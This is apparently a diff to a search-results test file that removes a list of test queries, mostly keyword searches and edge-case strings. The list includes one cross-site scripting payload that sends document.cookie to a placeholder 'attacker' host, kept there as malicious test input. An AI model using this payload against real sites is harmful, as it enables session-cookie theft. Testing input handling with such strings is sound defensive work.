@@ -17,43 +17,6 @@ import {
     SUITE_NAME,
 } from '../util';
 
-const QUERIES = [
-    // Keyword searches
-    'american government',
-    'ancient philosophy',
-    'Bérubé',
-    'politics',
-    'dilemma',
-    'education',
-    'faith',
-    'psychological',
-    'ramon lobato',
-    'renshon',
-    'shapiro',
-    'mind',
-    'Netflix',
-    'show sold separately',
-    'law science',
-
-    // Series
-    '"Connected Youth"',
-    '"connected youth and digital futures"',
-
-    // Numeric, advanced syntax, unusual and/or "bad" or malicious searches
-    '"cultural criticism"',
-    '*',
-    '<script>window.location="http://attacker/?cookie="+document.cookie</script>',
-    'and',
-    'asdfjklaj#$Q#$^%$&^g fasdlfkn~#%$Q%6546787',
-    'e',
-    'law and science',
-    'law AND science',
-    'literature -conflict',
-    'politics +community',
-    'the',
-    'the e g',
-];
-
 const goldenFiles = getGoldenFiles( SUITE_NAME.searchResults );
 
 let updateGoldenFiles = false;
